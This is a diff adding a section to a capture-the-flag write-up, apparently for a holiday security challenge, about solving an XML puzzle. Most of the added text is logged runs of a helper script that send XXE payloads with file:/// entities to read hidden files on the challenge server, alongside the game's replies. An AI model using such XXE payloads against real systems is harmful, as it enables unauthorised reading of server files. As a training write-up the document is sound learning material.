@@ -264,6 +264,105 @@ The face of an [icsemeller](https://deepai.org/):
 ![icsemeller](imgs/icsemeller.jpg)
 
 ##### Completing the challenge
+Here it required a leap of faith due to the fact that no XXEs were providing useful outputs. A quick discussion with my old friend `@i81b4u` confirmed that only the correct payload would give meaningful outputs. Remembering the “Significant CASE” hint, I went through the sentences again and got out with these keywords: `TRAFFIC FLIES`, `TAMPER`, `PATH`, `APP`, `TYPE`, `SIMPLE FORMAT`, `RINGLIST`. After some thinking and attempts I ended up finding the file `app/static/images/ringlist.txt`:
+```bash
+thedead@dellian:~$ python3 icsemeller.py 
+MiniLembanh: f32eb129-0edc-4060-a6ed-9308926c0b90.0dTlNErbw1QX5pan-r69c9cZ2C8
+GCLB: 12d422acb53f317b
+x-grinchum: IjZjOWIyZmZmY2ViM2VhZDUxMTY3N2QyODg3YzU5ZjI1Zjg5MWM2MTAi.Y7bsRw.HCblDkePeyPyUm34Q3JADt5ygw0
+Enter/Paste XML payload. Ctrl-D to end input.
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt">]>
+<root>
+    <imgDrop>&xxe;</imgDrop>
+    <who>princess</who>
+    <reqType>xml</reqType>
+</root>
+Payload is: <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt">]> <root>     <imgDrop>&xxe;</imgDrop>     <who>princess</who>     <reqType>xml</reqType> </root>
+Response: 
+{
+  "appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
+  "droppedOn": "none",
+  "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
+}
+```
+Accessing the URL in `visit` it was possible to retrieve this image:  
+![pholder-morethantopsupersecret](imgs/pholder-morethantopsupersecret63842.png)  
+The image itself gives the name of a folder (`x_phial_pholder_2022`) and of some files (`bluering.txt` and `redring.txt`), trying to fetch them with `icsemeller.py` and the same XXE gets the following responses:
+```bash
+thedead@dellian:~$ python3 icsemeller.py 
+MiniLembanh: fe29987f-0907-490c-b815-876dab318c94.dAmr6Oj0TM6d8wdVaOGMqsTCRSQ
+GCLB: 64ce3a034738c9cb
+x-grinchum: IjFmYjRmOTZhNDg1NjM2Nzk4MmU1ZTQxNTMyYWY5YmU2OWVhNmRkMjIi.Y8Q6mw.LRe1cZGj5wtGr0_8lOcCI45qThw
+Enter/Paste XML payload. Ctrl-D to end input.
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/redring.txt">]>
+<root>
+    <imgDrop>&xxe;</imgDrop>
+    <who>princess</who>
+    <reqType>xml</reqType>
+</root>
+Payload is: <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/redring.txt">]> <root>     <imgDrop>&xxe;</imgDrop>     <who>princess</who>     <reqType>xml</reqType> </root>
+Response: 
+{
+  "appResp": "Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.",
+  "droppedOn": "none",
+  "visit": "none"
+}
+```
+```bash
+thedead@dellian:~$ python3 icsemeller.py 
+MiniLembanh: fe29987f-0907-490c-b815-876dab318c94.dAmr6Oj0TM6d8wdVaOGMqsTCRSQ
+GCLB: 64ce3a034738c9cb
+x-grinchum: IjFmYjRmOTZhNDg1NjM2Nzk4MmU1ZTQxNTMyYWY5YmU2OWVhNmRkMjIi.Y8Q6mw.LRe1cZGj5wtGr0_8lOcCI45qThw
+Enter/Paste XML payload. Ctrl-D to end input.
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt">]>
+<root>
+    <imgDrop>&xxe;</imgDrop>
+    <who>princess</who>
+    <reqType>xml</reqType>
+</root>
+
+Payload is: <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt">]> <root>     <imgDrop>&xxe;</imgDrop>     <who>princess</who>     <reqType>xml</reqType> </root> 
+Response: 
+{
+  "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
+  "droppedOn": "none",
+  "visit": "none"
+}
+
+#################################################
+```
+Considering part of the discussion was on a silver ring, I also thought it was worth trying `silverring.txt`:
+```bash
+thedead@dellian:~$ python3 icsemeller.py 
+MiniLembanh: 016a0d1a-4fc8-436e-82e9-d2a5cb3af2ae.BK7gX7h3wai0jWMi5kBwmo6Zbi0
+GCLB: df87fef86fd76566
+x-grinchum: IjMzNjEwMWIxNzc4ZDMyNWYxNTliODJjNDlkNTZmMTZhMmI0YjEzODMi.Y7cV7A.CXA7ZHTnxbmu_xHeSWxJSF1tEag
+Enter/Paste XML payload. Ctrl-D to end input.
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt">]>
+<root>
+    <imgDrop>&xxe;</imgDrop>
+    <who>princess</who>
+    <reqType>xml</reqType>
+</root>
+Payload is: <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt">]> <root>     <imgDrop>&xxe;</imgDrop>     <who>princess</who>     <reqType>xml</reqType> </root>
+Response: 
+{
+  "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
+  "droppedOn": "none",
+  "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
+}
+```
+Following the link in the URL in the `visit` attribute leads to another image:  
+![redring-supersupersecret](imgs/redring-supersupersecret928164.png)  
+The image refers to a file called `goldring_to_be_deleted.txt`, but when fetching using XXE the replies are:
+* **Princess**: *Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.*
+* **Fountain**: *She's definitely hiding something.*
+
+
 
 
 
